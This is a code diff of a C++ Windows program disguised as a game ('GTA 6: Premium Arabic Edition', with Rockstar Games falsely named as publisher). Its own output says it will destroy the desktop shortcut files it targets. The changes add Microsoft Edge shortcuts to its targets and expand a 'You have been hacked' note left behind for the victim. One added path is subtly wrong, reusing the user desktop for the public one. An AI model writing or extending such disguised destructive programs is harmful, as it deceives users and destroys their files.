@@ -1,4 +1,4 @@
-// ver 1.0.0.0
+// ver 1.0.0.2
 
 #include <iostream>
 #include <fstream>
@@ -21,23 +21,25 @@ int main()
     std::string steamlnk = std::string(userProfile) + "\\Desktop\\Steam.lnk";
     std::string firefoxlnk = std::string(userProfile) + "\\Desktop\\Firefox.lnk";
     std::string sklauncherlnk = std::string(userProfile) + "\\Desktop\\SKlauncher.lnk";
+    std::string edgelnk = std::string(userProfile) + "\\Desktop\\Microsoft Edge.lnk";
     // allusers desktop defs
     std::string googlelnkpub = "C:\\Users\\Public\\Desktop\\Google Chrome.lnk";
     std::string steamlnkpub = "C:\\Users\\Public\\Desktop\\Steam.lnk";
     std::string bravelnkpub = "C:\\Users\\Public\\Desktop\\Brave.lnk";
     std::string firefoxlnkpub = "C:\\Users\\Public\\Desktop\\Firefox.lnk";
     std::string sklauncherlnkpub = "C:\\Users\\Public\\Desktop\\SKlauncher.lnk";
+    std::string edgelnkpub = std::string(userProfile) + "\\Desktop\\Microsoft Edge.lnk";
 
     std::cout << "GTA 6: Premium Arabic Edition -- Information For Executable\n";
     std::cout << "Application Name: GTA 6: Premium Arabic Edition\n";
     std::cout << "Publisher: Rockstar Games\n";
-    std::cout << "Compiler: C++ Visual Studio 2026\n";
+    std::cout << "Compiler: C++, Visual Studio 2026\n";
     std::cout << "\n";
 
-    std::cout << "Press ENTER to continue\n";
+    std::cout << "Press ENTER to continue";
     std::cin.get();
 
-    std::cout << "Real now, this will destroy your files on your desktop and your public pc desktop.\n";
+    std::cout << "\nReal now, this will destroy your files on your desktop and your public pc desktop.\n";
     std::cout << "Press ENTER to continue or close to close\n";
     std::cin.get();
 
@@ -104,15 +106,17 @@ int main()
     }
     std::ofstream outFile(filecrt);
     if (outFile.is_open()) {
-        outFile << "You have been hacked" << std::endl;
+        outFile << "You have been hacked by arabský muž" << std::endl;
+        outFile << "\nGood luck" << std::endl;
         outFile.close();
         std::cout << "File has been successfully created\n";
     } else {
-        std::cout << "File encountered an error while creating\n";
+        std::cout << "File encountered an error while creating\nQuitting..,";
+        return 1;
     }
 
     std::cout << "\nPress ENTER to exit...";
     std::cin.get();
 
-    return 1;
+    return 0;
 }
